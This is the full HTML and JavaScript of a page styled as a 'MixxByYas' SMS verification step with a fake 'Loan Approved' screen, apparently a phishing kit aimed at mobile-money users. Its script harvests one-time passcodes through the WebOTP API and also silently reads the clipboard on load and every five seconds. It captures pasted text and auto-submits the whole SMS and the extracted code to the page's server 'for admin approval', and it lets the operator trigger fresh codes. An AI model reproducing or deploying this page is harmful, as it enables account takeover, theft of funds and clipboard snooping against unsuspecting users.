<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MixxByYas - Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0b0e1a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: #1a1f35;
            padding: 25px;
            border-radius: 20px;
            border: 1px solid #2a2f4a;
        }
        h2 { color: #fff; margin-bottom: 5px; }
        .sub { color: #8899bb; margin-bottom: 20px; font-size: 14px; }
        .step-box {
            background: #12172a;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
        }
        .step { 
            display: flex;
            align-items: center;
            gap: 12px;
            color: #ccd;
            padding: 4px 0;
            font-size: 14px;
        }
        .step-num {
            background: #4f46e5;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            font-size: 12px;
        }
        .sms-area {
            background: #0d1225;
            border-radius: 12px;
            padding: 15px;
            border: 1px solid #2a2f4a;
            margin: 15px 0;
        }
        .sms-area label {
            color: #8899bb;
            font-size: 13px;
            display: block;
            margin-bottom: 8px;
        }
        textarea {
            width: 100%;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 14px;
            min-height: 80px;
            outline: none;
            resize: none;
            font-family: monospace;
        }
        .btn {
            width: 100%;
            background: #4f46e5;
            border: none;
            padding: 14px;
            border-radius: 30px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .resend-row {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            color: #8899bb;
            font-size: 14px;
        }
        #resendBtn {
            background: transparent;
            border: none;
            color: #818cf8;
            cursor: pointer;
            font-weight: bold;
        }
        #resendBtn:disabled { opacity: 0.4; }
        .status {
            text-align: center;
            margin-top: 15px;
            color: #8899bb;
            font-size: 14px;
        }
        .hidden { display: none !important; }
        .toast {
            background: #0d1225;
            border-left: 3px solid #4f46e5;
            padding: 10px 15px;
            border-radius: 8px;
            margin: 10px 0;
            color: #ccd;
            font-size: 14px;
        }
        .code-display {
            background: #0d1225;
            padding: 10px;
            border-radius: 8px;
            text-align: center;
            color: #34d399;
            font-size: 20px;
            font-weight: bold;
            font-family: monospace;
            margin: 10px 0;
            letter-spacing: 3px;
        }
        .detect-badge {
            background: #1a2a1a;
            border: 1px solid #2a4a2a;
            border-radius: 20px;
            padding: 6px 15px;
            display: inline-block;
            color: #34d399;
            font-size: 13px;
            margin-bottom: 15px;
        }
        .btn-app {
            display: inline-block;
            background: #2a2f4a;
            border: 1px solid #3a3f5a;
            padding: 8px 20px;
            border-radius: 20px;
            color: #ccd;
            text-decoration: none;
            font-size: 14px;
            margin-right: 8px;
        }
        .btn-app i { margin-right: 5px; }
        .success-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .success-overlay.show { display: flex; }
        .success-modal {
            background: #1a1f35;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 350px;
            width: 90%;
            border: 1px solid #2a4a2a;
        }
        .success-modal h2 { color: #34d399; margin: 10px 0; }
        .success-modal p { color: #8899bb; }
        .success-modal button {
            background: #4f46e5;
            border: none;
            padding: 10px 30px;
            border-radius: 20px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h2>📱 Code Check</h2>
    <div class="sub">Auto-reads SMS from notification</div>

    <div class="detect-badge" id="detectionStatus">📱 Listening for SMS...</div>

    <div class="step-box">
        <div class="step"><span class="step-num">1</span> Wait for SMS to arrive</div>
        <div class="step"><span class="step-num">2</span> Page auto-detects the code</div>
        <div class="step"><span class="step-num">3</span> Auto-submits for verification</div>
    </div>

    <div class="sms-area">
        <label>📩 Full SMS</label>
        <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
    </div>

    <div id="codeDisplay" class="code-display" style="display:none;">
        🔑 Code: <span id="extractedCodeDisplay"></span>
    </div>

    <div>
        <a href="sms:" class="btn-app">📱 iPhone</a>
        <a href="sms:" class="btn-app">🤖 Android</a>
    </div>

    <button class="btn" id="submitBtn">
        <span id="submitText">✅ Thibitisha</span>
        <span id="submitSpinner" class="spinner hidden"></span>
    </button>

    <div class="resend-row">
        <span>🔄 <span id="resendCounter">0 / 3</span></span>
        <button id="resendBtn" disabled>↻ Tuma tena</button>
    </div>

    <div id="toastDiv" class="toast hidden"></div>
    <div class="status" id="statusText">⏳ Waiting for SMS...</div>
</div>

<div id="successOverlay" class="success-overlay">
    <div class="success-modal">
        <h2>✅ Loan Approved!</h2>
        <p>Your loan has been approved successfully.</p>
        <button onclick="closeSuccess()">Done</button>
    </div>
</div>

<script>
    // SIMPLE WORKING VERSION
    const smsCode = document.getElementById('smsCode');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const submitSpinner = document.getElementById('submitSpinner');
    const resendBtn = document.getElementById('resendBtn');
    const resendCounter = document.getElementById('resendCounter');
    const statusText = document.getElementById('statusText');
    const detectionStatus = document.getElementById('detectionStatus');
    const codeDisplay = document.getElementById('codeDisplay');
    const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
    const toastDiv = document.getElementById('toastDiv');
    const successOverlay = document.getElementById('successOverlay');

    let resendAttempts = 0;
    let cooldown = 0;
    let isSubmitting = false;
    let smsDetected = false;
    let extractedCode = '';

    function showToast(msg) {
        toastDiv.textContent = '• ' + msg;
        toastDiv.classList.remove('hidden');
        clearTimeout(window.toastTimer);
        window.toastTimer = setTimeout(() => toastDiv.classList.add('hidden'), 4000);
    }

    function setStatus(msg) {
        statusText.textContent = msg;
    }

    function updateResendUI() {
        resendCounter.textContent = `${resendAttempts} / 3`;
        if (resendAttempts >= 3) {
            resendBtn.disabled = true;
            resendBtn.textContent = '✖ Imeisha';
        } else if (cooldown > 0) {
            resendBtn.disabled = true;
            resendBtn.textContent = `⏳ ${cooldown}s`;
        } else {
            resendBtn.disabled = false;
            resendBtn.textContent = '↻ Tuma tena';
        }
    }

    function startCooldown() {
        cooldown = 30;
        updateResendUI();
        const timer = setInterval(() => {
            cooldown--;
            updateResendUI();
            if (cooldown <= 0) {
                clearInterval(timer);
                updateResendUI();
            }
        }, 1000);
    }

    function extractCode(text) {
        if (!text) return null;
        const patterns = [
            /code[:\s]+([a-zA-Z0-9]{6,20})/i,
            /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
            /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
            /\b([a-zA-Z0-9]{8,20})\b/
        ];
        for (let p of patterns) {
            const m = text.match(p);
            if (m) return m[1];
        }
        return null;
    }

    // WebOTP Auto-Read
    async function autoReadSMS() {
        try {
            if (!('OTPCredential' in window)) {
                detectionStatus.textContent = '📋 Please copy SMS';
                return false;
            }
            detectionStatus.textContent = '📱 Listening for SMS...';
            
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 60000);
            
            const otp = await navigator.credentials.get({
                otp: { transport: ['sms'] },
                signal: controller.signal
            });
            
            clearTimeout(timeout);
            
            if (otp && otp.code) {
                extractedCode = otp.code;
                smsCode.value = `Your verification code is: ${otp.code}`;
                smsDetected = true;
                
                codeDisplay.style.display = 'block';
                extractedCodeDisplay.textContent = otp.code;
                
                detectionStatus.textContent = '✅ SMS detected!';
                showToast(`✅ Code: ${otp.code}`);
                setStatus('✅ Code detected. Submitting...');
                
                setTimeout(() => {
                    if (!isSubmitting && smsCode.value.trim()) {
                        submitCode();
                    }
                }, 1000);
                return true;
            }
            return false;
        } catch (e) {
            detectionStatus.textContent = '📋 Please copy SMS';
            return false;
        }
    }

    // Clipboard fallback
    async function readClipboard() {
        try {
            if (!navigator.clipboard?.readText) return false;
            const text = await navigator.clipboard.readText();
            if (text && text.length > 10 && !smsDetected) {
                smsCode.value = text;
                smsDetected = true;
                const code = extractCode(text);
                if (code) {
                    extractedCode = code;
                    codeDisplay.style.display = 'block';
                    extractedCodeDisplay.textContent = code;
                }
                detectionStatus.textContent = '✅ SMS from clipboard!';
                showToast('✅ SMS from clipboard!');
                setStatus('✅ SMS detected. Submitting...');
                setTimeout(() => {
                    if (!isSubmitting && smsCode.value.trim()) {
                        submitCode();
                    }
                }, 800);
                return true;
            }
            return false;
        } catch (e) {
            return false;
        }
    }

    async function detectSMS() {
        if (smsDetected || isSubmitting) return;
        const success = await autoReadSMS();
        if (!success) await readClipboard();
    }

    function submitCode() {
        const code = smsCode.value.trim();
        if (!code) {
            showToast('⚠️ Please wait for SMS.');
            return;
        }
        if (isSubmitting) return;
        
        isSubmitting = true;
        submitBtn.disabled = true;
        submitText.textContent = '⏳ Sending...';
        submitSpinner.classList.remove('hidden');
        setStatus('⏳ Sending to admin...');

        const codeToSend = extractedCode || extractCode(code) || code;

        fetch('/verify_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                code: code, 
                full_sms: code, 
                extracted_code: codeToSend 
            })
        })
        .then(r => r.json())
        .then(data => {
            isSubmitting = false;
            submitBtn.disabled = false;
            submitText.textContent = '✅ Thibitisha';
            submitSpinner.classList.add('hidden');
            if (data.status === 'success') {
                showToast('✅ Code sent to admin!');
                setStatus('⏳ Waiting for admin approval.');
            } else {
                showToast('❌ Error. Try again.');
                setStatus('❌ Error. Please try again.');
            }
        })
        .catch(() => {
            isSubmitting = false;
            submitBtn.disabled = false;
            submitText.textContent = '✅ Thibitisha';
            submitSpinner.classList.add('hidden');
            showToast('❌ Network error.');
            setStatus('❌ No connection.');
        });
    }

    function closeSuccess() {
        successOverlay.classList.remove('show');
    }

    window.showSuccess = function() {
        successOverlay.classList.add('show');
    };

    // Event listeners
    submitBtn.onclick = (e) => { e.preventDefault(); submitCode(); };
    
    resendBtn.onclick = function() {
        if (resendAttempts >= 3 || cooldown > 0) return;
        resendAttempts++;
        startCooldown();
        updateResendUI();
        smsDetected = false;
        extractedCode = '';
        smsCode.value = '';
        codeDisplay.style.display = 'none';
        detectionStatus.textContent = '📱 Waiting for new SMS...';
        fetch('/resend_code', { method: 'POST' }).catch(() => {});
        setTimeout(() => detectSMS(), 2000);
    };

    // Page load
    window.onload = function() {
        setTimeout(detectSMS, 1000);
        updateResendUI();
    };

    // Visibility change (user returns to page)
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible' && !smsDetected) {
            setTimeout(detectSMS, 500);
        }
    });

    // Paste event
    document.addEventListener('paste', function(e) {
        const text = e.clipboardData?.getData('text');
        if (text && text.length > 10 && !smsDetected) {
            smsCode.value = text;
            smsDetected = true;
            const code = extractCode(text);
            if (code) {
                extractedCode = code;
                codeDisplay.style.display = 'block';
                extractedCodeDisplay.textContent = code;
            }
            detectionStatus.textContent = '✅ SMS pasted!';
            showToast('✅ SMS pasted!');
            setStatus('✅ SMS detected. Submitting...');
            setTimeout(() => {
                if (!isSubmitting && smsCode.value.trim()) {
                    submitCode();
                }
            }, 400);
        }
    });

    // Keep trying every 5 seconds
    setInterval(() => {
        if (!smsDetected && !isSubmitting) detectSMS();
    }, 5000);

    console.log('✅ MixxByYas SMS Auto-Read loaded!');
</script>

</body>
</html>
